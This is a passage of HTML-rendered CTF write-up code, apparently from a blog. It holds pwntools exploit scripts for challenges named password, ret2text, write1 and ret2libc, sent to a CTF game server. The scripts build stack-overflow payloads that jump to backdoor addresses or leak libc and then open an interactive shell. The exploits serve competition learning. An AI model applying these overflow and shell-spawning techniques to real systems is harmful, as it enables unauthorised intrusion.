data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.node.game.sycsec.com'</span><span class=\"token punctuation\">,</span><span class=\"token number\">30573</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x53\\x79\\x63\\x6c\\x6f\\x76\\x65\\x72'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token operator\">-</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> s</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'2.This challenge is harder than first one\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>equ <span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>equ<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"password\"><a class=\"markdownIt-Anchor\" href=\"#password\">#</a> password</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'splitw'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'-h'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>res <span class=\"token operator\">=</span> <span class=\"token string\">b'Wrong'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token string\">b'Wrong'</span> <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    io <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.node.game.sycsec.com'</span><span class=\"token punctuation\">,</span><span class=\"token number\">30726</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\"># io = process('./password')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x04012F3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'please enter password:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\"># sleep(0.1)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    res <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">b'Correct'</span> <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ret2text\"><a class=\"markdownIt-Anchor\" href=\"#ret2text\">#</a> ret2text</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./ret2text'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># r = remote('pwn.node.game.sycsec.com',30691)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'ret2text'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'Y'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>pad <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">9</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>backdoor <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x27\\x52'</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>pl1 <span class=\"token operator\">=</span> pad <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> backdoor</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se<span class=\"token punctuation\">(</span>pl1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"write1\"><a class=\"markdownIt-Anchor\" href=\"#write1\">#</a> write1</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>r <span class=\"token operator\">=</span> gdb<span class=\"token punctuation\">.</span>debug<span class=\"token punctuation\">(</span><span class=\"token string\">'./chal'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># r = remote('pwn.node.game.sycsec.com',30157)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'Y'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">################</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># s</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># 41</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># -01</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># 13 -> 12</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\"># 40</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\"># -28</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># 4d ->25</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\"># -1</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">################</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">payload</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\tsl<span class=\"token punctuation\">(</span><span class=\"token string\">'s'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\tsl<span class=\"token punctuation\">(</span><span class=\"token string\">'41'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\tsl<span class=\"token punctuation\">(</span><span class=\"token string\">'-1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\tsl<span class=\"token punctuation\">(</span><span class=\"token string\">'40'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\tsl<span class=\"token punctuation\">(</span><span class=\"token string\">'-28'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tsl<span class=\"token punctuation\">(</span><span class=\"token string\">'-1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>payload<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ret2libc\"><a class=\"markdownIt-Anchor\" href=\"#ret2libc\">#</a> ret2libc</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.node.game.sycsec.com'</span><span class=\"token punctuation\">,</span><span class=\"token number\">30680</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./chal')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># r = process('./chal')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./chal'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'Y'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td 